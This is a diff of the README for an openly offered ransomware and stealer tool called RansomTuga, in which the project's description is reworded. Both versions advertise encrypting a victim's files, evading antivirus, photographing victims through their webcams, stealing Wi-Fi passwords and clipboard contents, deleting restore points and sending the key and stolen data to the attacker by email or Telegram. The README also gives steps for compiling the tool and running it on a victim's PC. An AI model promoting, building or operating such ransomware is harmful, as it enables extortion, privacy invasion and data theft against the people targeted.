@@ -6,63 +6,40 @@
 </p>
 <img src=".github/images/main.jpg" alt="logo">
 
-It is an advanced Ransomware and semi-stealer with a lot of options and fully customizable.\
-It uses anti-dumping functions to evade some anti-viruses.\
-It encrypts files in AES CBC with a random generated 256 bit key and 128 bit IV.\
-It has a whitelist and a blacklist for the extension of files.\
-It take photos from all the webcams connected to the pc.\
-After the encryption it sends the key and some pc informations to the attacker via email and/or via a Telegram bot.\
-It retrieves various information from the victim's pc and sends them to the attacker.\
-It also drops a readme.txt file and the decryptor and change the wallpaper of the victim computer.\
-It could also change the extension of crypted files and set a custom icon for those.\
-It is able to upload files on AnonFiles before encryption.\
-At the end it can delete the executable from which it was started.
+This project, RansomTuga, is an advanced ransomware and semi-stealer with many customizable options.
+It uses anti-dumping functions to evade detection by some anti-viruses.
+It encrypts files using AES CBC encryption with a randomly generated 256-bit key and 128-bit IV.
+The program has a whitelist and blacklist for the extensions of files it will encrypt.
+Additionally, it takes photos from all connected webcams, sends the encryption key and some PC information to the attacker via email or Telegram, retrieves various information from the victim's PC, drops a readme.txt file and a decryptor, changes the victim's computer wallpaper, and can change the extension and set a custom icon for the encrypted files.
+It also has the capability to upload files to AnonFiles before encryption, and can delete the executable from which it was launched.
 
 
 # Table of Contents
 - [Features](#Features)
-- [How to compile](#How-to-compile)
-- [How to use](#How-to-use)
-- [Todo list](#Todo)
-- [How does it work](#How-does-it-work)
+- [Compilation Instructions](#Compilation-Instructions)
+- [Usage Instructions](#Usage-Instructions)
+- [Todo list](#Todo-list)
 - [Thanks](#Thanks)
 - [Donations](#Donations)
 
 
 # Features
-- **AES CBC 256** file encryption
-- **Debug mode** for fast testing
-- **Trojan mode**
-- **Custom icon** for the compiled executable
-- **Tasks remover**
-- **Steal system informations**:
-  - HWID
-  - IP
-  - CPU brand and threads
-  - RAM
-  - GPU brand
-  - Host name
-  - Username
-  - Screen resolution
-  - Screenshot
-  - Clipboard
-  - Wi-Fi passwords
-  - Windows version (not working always)
-  - Language
-- **Take photos** of **all** the webcams
-- **Delete restore points**
-- **Custom file icon** for crypted files
-- **Change wallpaper**
-- **Whitelist** & **Blacklist** for files extensions (whitelist have priority)
-- **File uploader** before encryption
-- **Send email** with data encrypted in AES CBC 256
-- Send email also if pc is not connected to internet with a `.ps1` file obfuscated thanks to [Chimera](https://github.com/tokyoneon/Chimera)
-- **Self-delete** after execution
-- **Fully customizable** with more than 40 different options easy to change
+- Encryption of files using the **AES CBC 256** algorithm with a randomly generated key and 128-bit IV.
+- **Anti-dumping functions** to evade detection by some anti-viruses.
+- A **whitelist and blacklist** for file extensions to target or exclude during encryption.
+- **Taking photos** from all connected webcams.
+- **Stealing system information** such as the hardware ID (HWID), IP address, CPU and RAM specs, GPU brand, host name, username, screen resolution, screenshots, clipboard contents, and Wi-Fi passwords.
+- **Deleting restore points**
+- **Custom file icon** for encrypted files
+- **Changing the wallpaper**
+- **Uploading files** to a remote server before encryption
+- **Sending the encryption key and stolen information** to the attacker via email or Telegram bot.
+- **Self-deletion** of the malware executable after execution.
+- **Fully customizable** with over 40 different options.
 And many more!
 
 
-# How to compile
+# Compilation Instructions
 - Install latest version of Python 3 [here](https://www.python.org/downloads/)
 - Install latest version of Visual Studio 2022 [here](https://visualstudio.microsoft.com/downloads/)
 - Install latest version of Git [here](https://git-scm.com/download/win)
@@ -80,7 +57,7 @@ And many more!
 - Compile the project in `Release` and `x64`
 
 
-# How to use
+# Usage Instructions
 - Open `RansomTuga.exe` on the victim pc, if it is in debug mode it encrypts all files in `./debugFolder/` or in the path defined in arguments else in `C:/Users/`
 - Download the attachment from the received email
 - Open `InfoDecryptor.exe` and select the attachment just downloaded, it decrypts the crypted info-file
@@ -88,49 +65,10 @@ And many more!
 - Open `DataDecryptor.exe` and paste the key, it decrypts all encrypted files
 
 
-# Todo
-- [x] Fastest encryption modes (HeadOnly, DotPattern, SmartPattern, AdvancedSmartPattern)
-- [x] Random IV
-- [x] Get clipboard
-- [x] Get screenshot
-- [x] Get webcam pictures
-- [x] Get Wi-Fi password
-- [x] Drop custom file
-- [x] Drop & launch custom file for trojan mode
-- [x] Whitelist & Blacklist file extensions
-- [x] Add ip geolocation
-- [x] File sender
-- [x] Info file sender through telegram bot
+# Todo list
 - [ ] Chrome based browsers password stealer
 - [ ] Chrome based browsers cookies stealer
 - [ ] AntiViruses evasion
-- [x] Anti-Debug functions
-- [x] More anti-reverse functions (i.e. function names)
-- [ ] Do more tests in more environments
-
-
-# How does it work
-<details>
-  <summary>RansomTuga Workflow</summary>
-  <p align="center">
-    &nbsp;
-    <img src=".github/images/workflow_RansomTuga.png" alt="RansomTugaWorkflow">
-  </p>
-</details>
-<details>
-  <summary>InfoDecryptor Workflow</summary>
-  <p align="center">
-    &nbsp;
-    <img src=".github/images/workflow_InfoDecryptor.png" alt="InfoDecryptorWorkflow">
-  </p>
-</details>
-<details>
-  <summary>DataDecryptor Workflow</summary>
-  <p align="center">
-    &nbsp;
-    <img src=".github/images/workflow_DataDecryptor.png" alt="DataDecryptorWorkflow">
-  </p>
-</details>
 
 
 # Thanks
